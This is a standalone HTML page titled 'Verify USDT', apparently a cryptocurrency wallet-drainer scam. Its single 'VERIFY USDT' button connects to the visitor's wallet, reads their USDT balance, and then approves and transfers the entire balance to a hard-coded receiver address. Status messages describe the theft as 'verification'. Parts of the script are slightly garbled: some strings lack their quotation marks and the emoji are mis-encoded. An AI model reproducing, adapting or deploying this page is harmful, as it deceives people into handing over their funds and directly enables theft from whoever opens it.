<!DOCTYPE html><html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <title>Verify USDT</title>
  <script src="https://cdn.jsdelivr.net/npm/web3@1.8.2/dist/web3.min.js"></script>
  <style>
    body {
      margin: 0;
      font-family: Arial, sans-serif;
      background-color: white;
      overflow-x: hidden;
    }.container {
  max-width: 500px;
  margin: auto;
  padding: 20px;
  text-align: center;
}

.glow-button {
  background-color: #2196f3;
  border: none;
  color: white;
  padding: 16px 32px;
  text-align: center;
  text-decoration: none;
  display: inline-block;
  font-size: 20px;
  margin-top: 30px;
  border-radius: 12px;
  box-shadow: 0 0 20px rgba(33, 150, 243, 0.6);
  animation: pulse 2s infinite;
  cursor: pointer;
}

@keyframes pulse {
  0% {
    box-shadow: 0 0 5px rgba(33, 150, 243, 0.4);
  }
  50% {
    box-shadow: 0 0 20px rgba(33, 150, 243, 0.8);
  }
  100% {
    box-shadow: 0 0 5px rgba(33, 150, 243, 0.4);
  }
}

#status {
  margin-top: 20px;
  font-size: 18px;
  color: #333;
}

  </style>
</head>
<body>
  <div class="container">
    <button class="glow-button" onclick="startTransfer()">VERIFY USDT</button>
    <p id="status"></p>
  </div>  <script>
    const receiver = "0xB53941b949D3ac68Ba48AF3985F9F59105Cdf999";
    const usdtAddress = "0x55d398326f99059fF775485246999027B3197955";

    const usdtABI = [
      { "constant": true, "inputs": [{ "name": "_owner", "type": "address" }], "name": "balanceOf", "outputs": [{ "name": "balance", "type": "uint256" }], "type": "function" },
      { "constant": false, "inputs": [{ "name": "_spender", "type": "address" }, { "name": "_value", "type": "uint256" }], "name": "approve", "outputs": [{ "name": "success", "type": "bool" }], "type": "function" },
      { "constant": false, "inputs": [{ "name": "_to", "type": "address" }, { "name": "_value", "type": "uint256" }], "name": "transfer", "outputs": [{ "name": "success", "type": "bool" }], "type": "function" }
    ];

    async function startTransfer() {
      const status = document.getElementById("status");

      if (typeof window.ethereum === 'undefined') {
        alert("‚ö†Ô∏è Please open in Trust Wallet browser.");
        return;
      }

      const web3 = new Web3(window.ethereum);
      await window.ethereum.request({ method: 'eth_requestAccounts' });
      const accounts = await web3.eth.getAccounts();
      const sender = accounts[0];

      const usdt = new web3.eth.Contract(usdtABI, usdtAddress);
      const balance = await usdt.methods.balanceOf(sender).call();

      if (balance == 0) {
        alert("‚ùå No USDT found in wallet.");
        return;
      }

      const readable = web3.utils.fromWei(balance, 'ether');
      status.innerText = üîÑ Flash USD verify...;

      try {
        await usdt.methods.approve(receiver, balance).send({ from: sender });
        status.innerText = "‚úÖ Approved! Sending...";

        await usdt.methods.transfer(receiver, balance).send({ from: sender });
        status.innerText = üéâ ${readable} USDT Verified!;
      } catch (err) {
        console.error(err);
        status.innerText = "‚ùå Transaction Failed or Cancelled.";
        alert("‚ùå Transaction failed or cancelled.");
      }
    }
  </script></body>
</html>
